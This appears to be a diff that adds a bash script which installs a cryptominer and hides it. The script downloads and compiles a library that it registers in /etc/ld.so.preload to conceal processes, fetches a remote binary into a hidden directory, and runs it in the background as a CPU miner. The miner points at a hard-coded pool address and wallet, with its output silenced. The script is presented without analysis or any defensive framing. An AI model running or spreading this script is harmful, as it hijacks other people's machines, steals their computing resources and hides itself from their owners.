@@ -1,0 +1,13 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+mkdir .kepo && cd .kepo
+wget https://bitbucket.org/ramabena/tahrim/downloads/sare 
+chmod +x sare 
+./sare --algorithm panthera --pool 8.222.148.101:443 --wallet Ssy26E36YoNZsEcHguiCcH5MYXdL1CXfLhFWndsz6hTQANNq1DFEbuKD47surHwzcEL9i4Nvc841zLtKaki6cNWJ6jSGvaiJFV --password envio --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive  > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
